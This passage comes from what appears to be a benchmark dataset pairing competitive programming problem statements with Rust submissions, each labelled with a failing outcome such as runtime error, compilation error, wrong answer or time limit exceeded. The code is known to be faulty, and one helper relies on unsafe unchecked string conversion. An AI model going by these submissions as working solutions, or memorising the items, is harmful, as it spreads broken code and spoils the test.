was watching a hockey match, he fell asleep. Petya dreamt of being appointed to change a hockey team's name. Thus, Petya was given the original team name w and the collection of forbidden substrings s1,s2,...,sn. All those strings consist of uppercase and lowercase Latin letters. String w has the length of |w|, its characters are numbered from 1 to |w|.First Petya should find all the occurrences of forbidden substrings in the w string. During the search of substrings the case of letter shouldn't be taken into consideration. That is, strings \"aBC\" and \"ABc\" are considered equal.After that Petya should perform the replacement of all letters covered by the occurrences. More formally: a letter in the position i should be replaced by any other one if for position i in string w there exist pair of indices l,r (1\u2264l\u2264i\u2264r\u2264|w|) such that substring w[l\u00a0...\u00a0r] is contained in the collection s1,s2,...,sn, when using case insensitive comparison. During the replacement the letter's case should remain the same. Petya is not allowed to replace the letters that aren't covered by any forbidden substring.Letter letter (uppercase or lowercase) is considered lucky for the hockey players. That's why Petya should perform the changes so that the letter occurred in the resulting string as many times as possible. Help Petya to find such resulting string. If there are several such strings, find the one that comes first lexicographically.Note that the process of replacements is not repeated, it occurs only once. That is, if after Petya's replacements the string started to contain new occurrences of bad substrings, Petya pays no attention to them.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (1\u2264n\u2264100) \u2014 the number of forbidden substrings in the collection. Next n lines contain these substrings. The next line contains string w. All those n+1 lines are non-empty strings consisting of uppercase and lowercase Latin letters whose length does not exceed 100. The last line contains a lowercase letter letter.\n","output_spec":"Output the only line \u2014 Petya's resulting string with the maximum number of letters letter. If there are several answers then output the one that comes first lexicographically.\nThe lexicographical comparison is performed by the standard < operator in modern programming languages. The line a is lexicographically smaller than the line b, if a is a prefix of b, or there exists such an i (1\u2264i\u2264|a|), that ai<bi, and for any j (1\u2264j<i) aj=bj. |a| stands for the length of string a.\n","notes":null,"sample_inputs":["3\nbers\nucky\nelu\nPetrLoveLuckyNumbers\nt\n","4\nhello\nparty\nabefglghjdhfgj\nIVan\npetrsmatchwin\na\n","2\naCa\ncba\nabAcaba\nc\n"],"sample_outputs":["PetrLovtTttttNumtttt\n","petrsmatchwin\n","abCacba\n"]}
{"difficulty":2600,"lang":"Rust","lang_cluster":"rust","src_uid":"a9bad412597726f8cdc0cfa2da891bc4","submission_id":"re_926","tags":["dp","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"use std::io::{self, BufReader, Read, Stdin, Bytes};\nuse std::fmt::Debug;\nuse std::cmp;\nuse std::str::FromStr;\n\n\/\/\/ A stdin helper to deal with normal oj input.\npub struct OjReader<R> {\n    bs: Bytes<BufReader<R>>,\n}\n\npub fn from_stdin() -> OjReader<Stdin> {\n    let input = io::stdin();\n    let reader = BufReader::new(input);\n    OjReader { bs: reader.bytes() }\n}\n\nimpl<R: Read> OjReader<R> {\n    pub fn next<E, T>(&mut self) -> T\n        where E: Debug,\n              T: FromStr<Err = E>\n    {\n        loop {\n            match self.next_opt() {\n                Some(t) => return t,\n                None => {},\n            }\n        }\n    }\n\n    pub fn next_opt<E, T>(&mut self) -> Option<T>\n        where E: Debug,\n              T: FromStr<Err = E>\n    {\n        self.next_trunk(|b| b == b' ' || b == b'\\t' || b == b'\\n' || b == b'\\r')\n    }\n\n    \/\/ TODO: handle windows style line seperator \\r\\n\n    fn next_trunk<E, T, F>(&mut self, is_sep: F) -> Option<T>\n        where E: Debug,\n              T: FromStr<Err = E>,\n              F: Fn(u8) -> bool\n    {\n        let mut res = vec![];\n        loop {\n            match self.bs.next() {\n                None => {\n                    assert!(!res.is_empty());\n                    break;\n                },\n                Some(r) => {\n                    let b = r.unwrap();\n                    if is_sep(b) {\n                        break;\n                    }\n                    res.push(b);\n                }\n            }\n        }\n        if res.is_empty() {\n            return None;\n        }\n        unsafe { Some(String::from_utf8_unchecked(res).parse::<T>().unwrap()) }\n    }\n\n    pub fn next_line(&mut self) -> String {\n        self.next_line_opt().unwrap()\n    }\n\n    pub fn next_line_opt(&mut self) -> Option<String> {\n        self.next_trunk(|b| b == b'\\n' || b == b'\\r')\n    }\n}\n\nmacro_rules! odiv {\n    ($lhs:expr, $rhs:expr) => ({\n        if $lhs < 0 {\n            0\n        } else {\n            $lhs \/ $rhs + 1\n        }\n    });\n}\n\n#[derive(Debug)]\nstruct Problem {\n    a: isize,\n    b: isize,\n    thls: Vec<isize>,\n}\n\nfn search(p: &mut Problem, i: usize, tmp_sol: &mut Vec<usize>, sol: &mut Vec<usize>) {\n    assert!(i > 0);\n    if i == p.thls.len() - 2 {\n        let res = cmp::max(odiv!(p.thls[i], p.a), odiv!(cmp::max(p.thls[i - 1], p.thls[i + 1]), p.b)) as usize;\n        if !sol.is_empty() && sol.len() <= tmp_sol.len() + res {\n            return;\n        }\n        *sol = tmp_sol.clone();\n        for _ in 0..res {\n            sol.push(i + 1);\n        }\n    } else if i < p.thls.len() - 2 {\n        let min = odiv!(p.thls[i - 1], p.b) as usize;\n        let max = cmp::max(odiv!(p.thls[i], p.a), odiv!(p.thls[i + 1], p.b)) as usize;\n        let (old_one, old_two, last_moves) = (p.thls[i], p.thls[i + 1], tmp_sol.len());\n        p.thls[i] -= p.a * min as isize;\n        p.thls[i + 1] -= p.b * min as isize;\n        tmp_sol.resize(last_moves + min, i + 1);\n        for _ in min..cmp::max(min + 1, max) {\n            search(p, i + 1, tmp_sol, sol);\n            p.thls[i] -= p.a;\n            p.thls[i + 1] -= p.b;\n            tmp_sol.push(i + 1);\n            if tmp_sol.len() > sol.len() {\n                break;\n            }\n        }\n        p.thls[i] = old_one;\n        p.thls[i + 1] = old_two;\n        tmp_sol.truncate(last_moves);\n    } else {\n        unreachable!();\n    }\n}\n\n\/\/ Simple a + b example\nfn main() {\n    let mut reader = from_stdin();\n    let (n, a, b) = (reader.next(), reader.next(), reader.next());\n    let mut problem = Problem {\n        a: a,\n        b: b,\n        thls: Vec::with_capacity(n),\n    };\n    for _ in 0..n {\n        problem.thls.push(reader.next());\n    }\n    let (mut tmp_sol, mut sol) = (vec![], vec![]);\n    search(&mut problem, 1, &mut tmp_sol, &mut sol);\n    println!(\"{}\", sol.len());\n    for idx in sol {\n        print!(\"{} \", idx);\n    }\n    print!(\"\\n\");\n}\n","description":"This is simplified version of the problem used on the original contest. The original problem seems to have too difiicult solution. The constraints for input data have been reduced.Polycarp likes to play computer role-playing game \u00abLizards and Basements\u00bb. At the moment he is playing it as a magician. At one of the last levels he has to fight the line of archers. The only spell with which he can damage them is a fire ball. If Polycarp hits the i-th archer with his fire ball (they are numbered from left to right), the archer loses a health points. At the same time the spell damages the archers adjacent to the i-th (if any) \u2014 they lose b (1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910) health points each.As the extreme archers (i.e. archers numbered 1 and n) are very far, the fire ball cannot reach them. Polycarp can hit any other archer with his fire ball.The amount of health points for each archer is known. An archer will be killed when this amount is less than 0. What is the minimum amount of spells Polycarp can use to kill all the enemies?Polycarp can throw his fire ball into an archer if the latter is already killed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n,\u2009a,\u2009b (3\u2009\u2264\u2009n\u2009\u2264\u200910; 1\u2009\u2264\u2009b\u2009&lt;\u2009a\u2009\u2264\u200910). The second line contains a sequence of n integers \u2014 h1,\u2009h2,\u2009...,\u2009hn (1\u2009\u2264\u2009hi\u2009\u2264\u200915), where hi is the amount of health points the i-th archer has.","output_spec":"In the first line print t \u2014 the required minimum amount of fire balls. In the second line print t numbers \u2014 indexes of the archers that Polycarp should hit to kill all the archers in t shots. All these numbers should be between 2 and n\u2009-\u20091. Separate numbers with spaces. If there are several solutions, output any of them. Print numbers in any order.","notes":null,"sample_inputs":["3 2 1\n2 2 2","4 3 1\n1 4 1 1"],"sample_outputs":["3\n2 2 2","4\n2 2 3 3"]}
{"difficulty":2600,"lang":"Rust","lang_cluster":"rust","src_uid":"ba9c136f84375cd317f0f8b53e3939c7","submission_id":"re_563","tags":["dp","probabilities"],"exec_outcome":"COMPILATION_ERROR","source_code":"#[allow(unused_imports)]\nuse std::cmp::*;\n#[allow(unused_imports)]\nuse std::collections::*;\nuse std::io::{Write, BufWriter};\n\/\/ https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8\nmacro_rules! input {\n    ($($r:tt)*) => {\n        let stdin = std::io::stdin();\n        let mut bytes = std::io::Read::bytes(std::io::BufReader::new(stdin.lock()));\n        let mut next = move || -> String{\n            bytes\n                .by_ref()\n                .map(|r|r.unwrap() as char)\n                .skip_while(|c|c.is_whitespace())\n                .take_while(|c|!c.is_whitespace())\n                .collect()\n        };\n        input_inner!{next, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($next:expr) => {};\n    ($next:expr, ) => {};\n\n    ($next:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($next, $t);\n        input_inner!{$next $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($next:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($next, $t)),* )\n    };\n\n    ($next:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($next, $t)).collect::<Vec<_>>()\n    };\n\n    ($next:expr, chars) => {\n        read_value!($next, String).chars().collect::<Vec<char>>()\n    };\n\n    ($next:expr, usize1) => {\n        read_value!($next, usize) - 1\n    };\n\n    ($next:expr, [ $t:tt ]) => {{\n        let len = read_value!($next, usize);\n        (0..len).map(|_| read_value!($next, $t)).collect::<Vec<_>>()\n    }};\n\n    ($next:expr, $t:ty) => {\n        $next().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n\/\/\/ Verified by https:\/\/atcoder.jp\/contests\/arc093\/submissions\/3968098\nmod mod_int {\n    use std::ops::*;\n    pub trait Mod: Copy { fn m() -> i64; }\n    #[derive(Copy, Clone, Hash, PartialEq, Eq, PartialOrd, Ord)]\n    pub struct ModInt<M> { pub x: i64, phantom: ::std::marker::PhantomData<M> }\n    impl<M: Mod> ModInt<M> {\n        \/\/ x >= 0\n        pub fn new(x: i64) -> Self { ModInt::new_internal(x % M::m()) }\n        fn new_internal(x: i64) -> Self {\n            ModInt { x: x, phantom: ::std::marker::PhantomData }\n        }\n        pub fn pow(self, mut e: i64) -> Self {\n            debug_assert!(e >= 0);\n            let mut sum = ModInt::new_internal(1);\n            let mut cur = self;\n            while e > 0 {\n                if e % 2 != 0 { sum *= cur; }\n                cur *= cur;\n                e \/= 2;\n            }\n            sum\n        }\n        #[allow(dead_code)]\n        pub fn inv(self) -> Self { self.pow(M::m() - 2) }\n    }\n    impl<M: Mod, T: Into<ModInt<M>>> Add<T> for ModInt<M> {\n        type Output = Self;\n        fn add(self, other: T) -> Self {\n            let other = other.into();\n            let mut sum = self.x + other.x;\n            if sum >= M::m() { sum -= M::m(); }\n            ModInt::new_internal(sum)\n        }\n    }\n    impl<M: Mod, T: Into<ModInt<M>>> Sub<T> for ModInt<M> {\n        type Output = Self;\n        fn sub(self, other: T) -> Self {\n            let other = other.into();\n            let mut sum = self.x - other.x;\n            if sum < 0 { sum += M::m(); }\n            ModInt::new_internal(sum)\n        }\n    }\n    impl<M: Mod, T: Into<ModInt<M>>> Mul<T> for ModInt<M> {\n        type Output = Self;\n        fn mul(self, other: T) -> Self { ModInt::new(self.x * other.into().x % M::m()) }\n    }\n    impl<M: Mod, T: Into<ModInt<M>>> AddAssign<T> for ModInt<M> {\n        fn add_assign(&mut self, other: T) { *self = *self + other; }\n    }\n    impl<M: Mod, T: Into<ModInt<M>>> SubAssign<T> for ModInt<M> {\n        fn sub_assign(&mut self, other: T) { *self = *self - other; }\n    }\n    impl<M: Mod, T: Into<ModInt<M>>> MulAssign<T> for ModInt<M> {\n        fn mul_assign(&mut self, other: T) { *self = *self * other; }\n    }\n    impl<M: Mod> Neg for ModInt<M> {\n        type Output = Self;\n        fn neg(self) -> Self { ModInt::new(0) - self }\n    }\n    impl<M> ::std::fmt::Display for ModInt<M> {\n        fn fmt(&self, f: &mut ::std::fmt::Formatter) -> ::std::fmt::Result {\n            self.x.fmt(f)\n        }\n    }\n    impl<M: Mod> ::std::fmt::Debug for ModInt<M> {\n        fn fmt(&self, f: &mut ::std::fmt::Formatter) -> ::std::fmt::Result {\n            let (mut a, mut b, _) = red(self.x, M::m());\n            if b < 0 {\n                a = -a;\n                b = -b;\n            }\n            write!(f, \"{}\/{}\", a, b)\n        }\n    }\n    impl<M: Mod> From<i64> for ModInt<M> {\n        fn from(x: i64) -> Self { Self::new(x) }\n    }\n    \/\/ Finds the simplest fraction x\/y congruent to r mod p.\n    \/\/ The return value (x, y, z) satisfies x = y * r + z * p.\n    fn red(r: i64, p: i64) -> (i64, i64, i64) {\n        if r.abs() <= 10000 {\n            return (r, 1, 0);\n        }\n        let mut nxt_r = p % r;\n        let mut q = p \/ r;\n        if 2 * nxt_r >= r {\n            nxt_r -= r;\n            q += 1;\n        }\n        if 2 * nxt_r <= -r {\n            nxt_r += r;\n            q -= 1;\n        }\n        let (x, z, y) = red(nxt_r, r);\n        (x, y - q * z, z)\n    }\n} \/\/ mod mod_int\n\nmacro_rules! define_mod {\n    ($struct_name: ident, $modulo: expr) => {\n        #[derive(Copy, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]\n        struct $struct_name {}\n        impl mod_int::Mod for $struct_name { fn m() -> i64 { $modulo } }\n    }\n}\nconst MOD: i64 = 998244353;\ndefine_mod!(P, MOD);\ntype ModInt = mod_int::ModInt<P>;\n\nfn solve() {\n    let out = std::io::stdout();\n    let mut out = BufWriter::new(out.lock());\n    macro_rules! puts {\n        ($($format:tt)*) => (write!(out,$($format)*).unwrap());\n    }\n    input! {\n        n: usize, m: usize,\n        a: [i32; n],\n        w: [i64; n],\n    }\n    let mut dp = vec![vec![[ModInt::new(0); 2]; m + 1]; m + 1];\n    let mut prob = vec![vec![[ModInt::new(0); 2]; m + 1]; m + 1];\n    let mut wsum = ModInt::new(0);\n    let mut upsum = ModInt::new(0);\n    let mut downsum = ModInt::new(0);\n    for i in 0..n {\n        wsum += w[i];\n        if a[i] == 1 {\n            upsum += w[i];\n        } else {\n            downsum += w[i];\n        }\n    }\n    dp[0][0] = [ModInt::new(1); 2];\n    prob[0][0] = [ModInt::new(1); 2];\n    for up in 0..2 {\n        for i in 0..m {\n            for j in 0..m - i {\n                \/\/ TODO O(log MOD)\n                let whole = wsum + i as i64 - j as i64;\n                if whole == ModInt::new(0) || dp[i][j][up] == ModInt::new(0) {\n                    continue;\n                }\n                let wholeinv = whole.inv();\n                let up_coef = if up == 1 {\n                    upsum + i as i64 + 1\n                } else {\n                    upsum + i as i64\n                } * wholeinv;\n                let down_coef = if up == 1 {\n                    downsum - j as i64\n                } else {\n                    downsum - j as i64 - 1\n                } * wholeinv;\n                dp[i + 1][j][up] += up_coef * dp[i][j][up];\n                dp[i][j + 1][up] += down_coef * dp[i][j][up];\n                prob[i + 1][j][up] += (upsum + i as i64) * wholeinv * dp[i][j][up];\n                prob[i][j + 1][up] += (downsum - i as i64) * wholeinv * dp[i][j][up];\n            }\n        }\n    }\n    let mut ans = [ModInt::new(0); 2];\n    for up in 0..2 {\n        for i in 0..m + 1 {\n            ans[up] += dp[i][m - i][up];\n        }\n    }\n    for i in 0..n {\n        if a[i] == 1 {\n            puts!(\"{}\\n\", ans[1] * w[i]);\n        } else {\n            puts!(\"{}\\n\", ans[0] * w[i]);\n        }\n    }\n    \n}\n\nfn main() {\n    \/\/ In order to avoid potential stack overflow, spawn a new thread.\n    let stack_size = 104_857_600; \/\/ 100 MB\n    let thd = std::thread::Builder::new().stack_size(stack_size);\n    thd.spawn(|| solve()).unwrap().join().unwrap();\n}\n","description":"The only difference between easy and hard versions is constraints.Nauuo is a girl who loves random picture websites.One day she made a random picture website by herself which includes $$$n$$$ pictures.When Nauuo visits the website, she sees exactly one picture. The website does not display each picture with equal probability. The $$$i$$$-th picture has a non-negative weight $$$w_i$$$, and the probability of the $$$i$$$-th picture being displayed is $$$\\frac{w_i}{\\sum_{j=1}^nw_j}$$$. That is to say, the probability of a picture to be displayed is proportional to its weight.However, Nauuo discovered that some pictures she does not like were displayed too often. To solve this problem, she came up with a great idea: when she saw a picture she likes, she would add $$$1$$$ to its weight; otherwise, she would subtract $$$1$$$ from its weight.Nauuo will visit the website $$$m$$$ times. She wants to know the expected weight of each picture after all the $$$m$$$ visits modulo $$$998244353$$$. Can you help her?The expected weight of the $$$i$$$-th picture can be denoted by $$$\\frac {q_i} {p_i}$$$ where $$$\\gcd(p_i,q_i)=1$$$, you need to print an integer $$$r_i$$$ satisfying $$$0\\le r_i&lt;998244353$$$ and $$$r_i\\cdot p_i\\equiv q_i\\pmod{998244353}$$$. It can be proved that such $$$r_i$$$ exists and is unique.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$m$$$ ($$$1\\le n\\le 2\\cdot 10^5$$$, $$$1\\le m\\le 3000$$$) \u2014 the number of pictures and the number of visits to the website. The second line contains $$$n$$$ integers $$$a_1,a_2,\\ldots,a_n$$$ ($$$a_i$$$ is either $$$0$$$ or $$$1$$$) \u2014 if $$$a_i=0$$$ , Nauuo does not like the $$$i$$$-th picture; otherwise Nauuo likes the $$$i$$$-th picture. It is guaranteed that there is at least one picture which Nauuo likes. The third line contains $$$n$$$ positive integers $$$w_1,w_2,\\ldots,w_n$$$ ($$$w_i \\geq 1$$$) \u2014 the initial weights of the pictures. It is guaranteed that the sum of all the initial weights does not exceed $$$998244352-m$$$.","output_spec":"The output contains $$$n$$$ integers $$$r_1,r_2,\\ldots,r_n$$$ \u2014 the expected weights modulo $$$998244353$$$.","notes":"NoteIn the first example, if the only visit shows the first picture with a probability of $$$\\frac 2 3$$$, the final weights are $$$(1,1)$$$; if the only visit shows the second picture with a probability of $$$\\frac1 3$$$, the final weights are $$$(2,2)$$$.So, both expected weights are $$$\\frac2 3\\cdot 1+\\frac 1 3\\cdot 2=\\frac4 3$$$ .Because $$$332748119\\cdot 3\\equiv 4\\pmod{998244353}$$$, you need to print $$$332748119$$$ instead of $$$\\frac4 3$$$ or $$$1.3333333333$$$.In the second example, there is only one picture which Nauuo likes, so every time Nauuo visits the website, $$$w_1$$$ will be increased by $$$1$$$.So, the expected weight is $$$1+2=3$$$.Nauuo is very naughty so she didn't give you any hint of the third example.","sample_inputs":["2 1\n0 1\n2 1","1 2\n1\n1","3 3\n0 1 1\n4 3 5"],"sample_outputs":["332748119\n332748119","3","160955686\n185138929\n974061117"]}
{"difficulty":1700,"lang":"Rust","lang_cluster":"rust","src_uid":"c1cfe1f67217afd4c3c30a6327e0add9","submission_id":"795273fd00a8a1c89a0d7bd958909d0d","tags":["geometry","brute force","math"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8 \u3088\u308a\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let s = {\n            use std::io::Read;\n            let mut s = String::new();\n            std::io::stdin().read_to_string(&mut s).unwrap();\n            s\n        };\n        let mut iter = s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($iter:expr) => {};\n    ($iter:expr, ) => {};\n    ($iter:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($iter, $t);\n        input_inner!{$iter $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($iter:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($iter, $t)),* )\n    };\n    ($iter:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($iter, $t)).collect::<Vec<_>>()\n    };\n    ($iter:expr, chars) => {\n        read_value!($iter, String).chars().collect::<Vec<char>>()\n    };\n    ($iter:expr, bytes) => {\n        read_value!($iter, String).bytes().collect::<Vec<u8>>()\n    };\n    ($iter:expr, usize1) => {\n        read_value!($iter, usize) - 1\n    };\n    ($iter:expr, $t:ty) => {\n        $iter.next().unwrap().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n\/\/\n\nfn run() {\n    input! {\n        n: usize,\n        p: [[i64; 5]; n],\n    }\n    if n > 10 {\n        println!(\"0\");\n        return;\n    }\n    let mut ans = vec![];\n    for i in 0..n {\n        let mut q = p.clone();\n        let p = q.remove(i);\n        for q in q.iter_mut() {\n            for (q, p) in q.iter_mut().zip(p.iter()) {\n                *q -= *p;\n            }\n        }\n        let mut ok = true;\n        for (i, a) in q.iter().enumerate() {\n            for b in q.iter().take(i) {\n                let mut sum = 0;\n                for (a, b) in a.iter().zip(b.iter()) {\n                    sum += *a * *b;\n                }\n                if sum > 0 {\n                    ok = false;\n                }\n            }\n        }\n        if ok {\n            ans.push(i + 1);\n        }\n    }\n    println!(\"{}\", ans.len());\n    for (i, a) in ans.iter().enumerate() {\n        if i > 0 {\n            print!(\" \");\n        }\n        print!(\"{}\", a);\n    }\n    println!();\n}\n\nfn main() {\n    run();\n}\n","description":"You are given set of n points in 5-dimensional space. The points are labeled from 1 to n. No two points coincide.We will call point a bad if there are different points b and c, not equal to a, from the given set such that angle between vectors  and  is acute (i.e. strictly less than ). Otherwise, the point is called good.The angle between vectors  and  in 5-dimensional space is defined as , where  is the scalar product and  is length of .Given the list of points, print the indices of the good points in ascending order.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009103)\u00a0\u2014 the number of points. The next n lines of input contain five integers ai,\u2009bi,\u2009ci,\u2009di,\u2009ei (|ai|,\u2009|bi|,\u2009|ci|,\u2009|di|,\u2009|ei|\u2009\u2264\u2009103) \u00a0\u2014 the coordinates of the i-th point. All points are distinct.","output_spec":"First, print a single integer k\u00a0\u2014 the number of good points. Then, print k integers, each on their own line\u00a0\u2014 the indices of the good points in ascending order.","notes":"NoteIn the first sample, the first point forms exactly a  angle with all other pairs of points, so it is good.In the second sample, along the cd plane, we can see the points look as follows:We can see that all angles here are acute, so no points are good.","sample_inputs":["6\n0 0 0 0 0\n1 0 0 0 0\n0 1 0 0 0\n0 0 1 0 0\n0 0 0 1 0\n0 0 0 0 1","3\n0 0 1 2 0\n0 0 9 2 0\n0 0 5 9 0"],"sample_outputs":["1\n1","0"]}
{"difficulty":1600,"lang":"Rust","lang_cluster":"rust","src_uid":"c761bb69cf1b5a3dbe38d9f5c46e9007","submission_id":"re_186","tags":["data structures","constructive algorithms","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"macro_rules! parse_line {\n    ($t: ty) => ({\n        let mut a_str = String::new();\n        std::io::stdin().read_line(&mut a_str).expect(\"read error\");\n        let a_str = a_str.trim();\n        a_str.parse::<$t>().expect(\"parse error\")\n    });\n    ($($t: ty),+) => ({\n        let mut a_str = String::new();\n        std::io::stdin().read_line(&mut a_str).expect(\"read error\");\n        let mut a_iter = a_str.split_whitespace();\n        (\n            $(\n            a_iter.next().unwrap().parse::<$t>().expect(\"parse error\"),\n            )+\n        )\n    })\n}\n\n#[allow(unused_macros)]\nmacro_rules! parse_line_to_vec {\n    ($t: ty) => {{\n        let mut a_str = String::new();\n        std::io::stdin().read_line(&mut a_str).expect(\"read error\");\n        (a_str\n            .split_whitespace()\n            .map(|x| x.parse::<$t>().unwrap())\n            .collect::<Vec<$t>>())\n    }};\n}\n\nuse std::io::Write;\n\nfn solve(writer: &mut std::io::BufWriter<std::io::Stdout>) {\n    let (n, m) = parse_line!(usize, usize);\n    let mut a = Vec::new();\n    let mut pro = vec![0; n];\n    let mut con = vec![0; n];\n    let mut cons = 0;\n    for _ in 0..n {\n        let x = parse_line!(i32);\n        a.push(x);\n        if x > 0 {\n            pro[(x - 1) as usize] += 1;\n        }else{\n            con[(-x - 1) as usize] += 1;\n            cons += 1;\n        }\n    }\n    let mut candidates = vec![false; n];\n    let mut single = false;\n    let mut more = false;\n    for i in 0..n {\n        if pro[i] + cons - con[i] == m {\n            more = single;\n            single = true;\n            candidates[i] = true;\n        }\n    }\n    for x in a {\n        if x > 0 {\n            if candidates[(x - 1) as usize] {\n                if single && !more {\n                    writeln!(writer, \"Truth\").unwrap();\n                }else{\n                    writeln!(writer, \"Not defined\").unwrap();\n                }\n            }else{\n                writeln!(writer, \"Lie\").unwrap();\n            }\n        }else{\n            if !candidates[(-x - 1) as usize] {\n                writeln!(writer, \"Truth\").unwrap();\n            }else{\n                writeln!(writer, \"Not defined\").unwrap();\n            }\n        }\n    }\n}\n\nfn main() {\n    let mut writer = std::io::BufWriter::new(std::io::stdout());\n    let tests = 1; \/\/ parse_line!(usize);\n    for _ in 0..tests {\n        solve(&mut writer);\n    }\n}\n","description":"As Sherlock Holmes was investigating a crime, he identified n suspects. He knows for sure that exactly one of them committed the crime. To find out which one did it, the detective lines up the suspects and numbered them from 1 to n. After that, he asked each one: \"Which one committed the crime?\". Suspect number i answered either \"The crime was committed by suspect number ai\", or \"Suspect number ai didn't commit the crime\". Also, the suspect could say so about himself (ai\u2009=\u2009i).Sherlock Holmes understood for sure that exactly m answers were the truth and all other answers were a lie. Now help him understand this: which suspect lied and which one told the truth?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20090\u2009\u2264\u2009m\u2009\u2264\u2009n) \u2014 the total number of suspects and the number of suspects who told the truth. Next n lines contain the suspects' answers. The i-th line contains either \"+ai\" (without the quotes), if the suspect number i says that the crime was committed by suspect number ai, or \"-ai\" (without the quotes), if the suspect number i says that the suspect number ai didn't commit the crime (ai is an integer, 1\u2009\u2264\u2009ai\u2009\u2264\u2009n). It is guaranteed that at least one suspect exists, such that if he committed the crime, then exactly m people told the truth.","output_spec":"Print n lines. Line number i should contain \"Truth\" if suspect number i has told the truth for sure. Print \"Lie\" if the suspect number i lied for sure and print \"Not defined\" if he could lie and could tell the truth, too, depending on who committed the crime.","notes":"NoteThe first sample has the single person and he confesses to the crime, and Sherlock Holmes knows that one person is telling the truth. That means that this person is telling the truth.In the second sample there are three suspects and each one denies his guilt. Sherlock Holmes knows that only two of them are telling the truth. Any one of them can be the criminal, so we don't know for any of them, whether this person is telling the truth or not.In the third sample the second and the fourth suspect defend the first and the third one. But only one is telling the truth, thus, the first or the third one is the criminal. Both of them can be criminals, so the second and the fourth one can either be lying or telling the truth. The first and the third one are lying for sure as they are blaming the second and the fourth one.","sample_inputs":["1 1\n+1","3 2\n-1\n-2\n-3","4 1\n+2\n-3\n+4\n-1"],"sample_outputs":["Truth","Not defined\nNot defined\nNot defined","Lie\nNot defined\nLie\nNot defined"]}
{"difficulty":1600,"lang":"Rust","lang_cluster":"rust","src_uid":"d3a0402de1338a1a542a86ac5b484acc","submission_id":"re_1088","tags":["dp","number theory","math"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"use std::io::{self, BufWriter, Write};\nuse std::str::{self, SplitAsciiWhitespace};\n\n\/\/ I have no idea what I'm doing\n\nstruct It {\n    x: usize,\n    n: usize,\n    mark: Vec<bool>,\n}\n\nfn primes_that_divide(n: usize) -> It {\n    It {\n        x: 2,\n        n: n,\n        mark: vec![false; n + 1],\n    }\n}\n\nimpl Iterator for It {\n    type Item = usize;\n    fn next(&mut self) -> Option<Self::Item> {\n        while self.x <= self.n {\n            if self.mark[self.x] {\n                self.x += 1;\n                continue;\n            }\n\n            for y in self.mark.iter_mut().skip(self.x).step_by(self.x) {\n                *y = true;\n            }\n\n            if self.n % self.x == 0 {\n                self.x += 1;\n                return Some(self.x - 1);\n            }\n\n            self.x += 1;\n        }\n\n        None\n    }\n}\n\nfn is_lucky(n: usize, mood: &[bool], p: usize) -> bool {\n    let step = n \/ p;\n    (0..step).any(|start|\n        (start..n).step_by(step).all(|i| mood[i]))\n}\n\nfn main() -> Result<(), io::Error> {\n    let (stdin, stdout) = (io::stdin(), io::stdout());\n    let mut scan = UnsafeScanner::new(stdin.lock());\n    let mut out = BufWriter::new(stdout.lock());\n\n    let n: usize = scan.token();\n    let mood: Vec<_> = (0..n).map(|_| scan.token::<char>()).map(|c| c == '1').collect();\n\n    let ans = primes_that_divide(n)\n                .filter(|&p| p > 2)\n                .any(|p| is_lucky(n, &mood, p));\n\n    writeln!(out, \"{}\", match ans {\n        true => \"YES\",\n        false => \"NO\",\n    })?;\n\n    Ok(())\n}\n\n\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\n\n\/\/\/ Copied from https:\/\/github.com\/EbTech\/rust-algorithms\/blob\/master\/src\/scanner.rs\n\/\/\/ Same API as Scanner but nearly twice as fast, using horribly unsafe dark arts\n\/\/\/ **REQUIRES** Rust 1.34 or higher\npub struct UnsafeScanner<R> {\n    reader: R,\n    buf_str: Vec<u8>,\n    buf_iter: SplitAsciiWhitespace<'static>,\n}\n\nimpl<R: io::BufRead> UnsafeScanner<R> {\n    pub fn new(reader: R) -> Self {\n        Self {\n            reader,\n            buf_str: vec![],\n            buf_iter: \"\".split_ascii_whitespace(),\n        }\n    }\n\n    \/\/\/ This function should be marked unsafe, but noone has time for that in a\n    \/\/\/ programming contest. Use at your own risk!\n    pub fn token<T: str::FromStr>(&mut self) -> T {\n        loop {\n            if let Some(token) = self.buf_iter.next() {\n                return token.parse().ok().expect(\"Failed parse\");\n            }\n            self.buf_str.clear();\n            self.reader\n                .read_until(b'\\n', &mut self.buf_str)\n                .expect(\"Failed read\");\n            self.buf_iter = unsafe {\n                let slice = 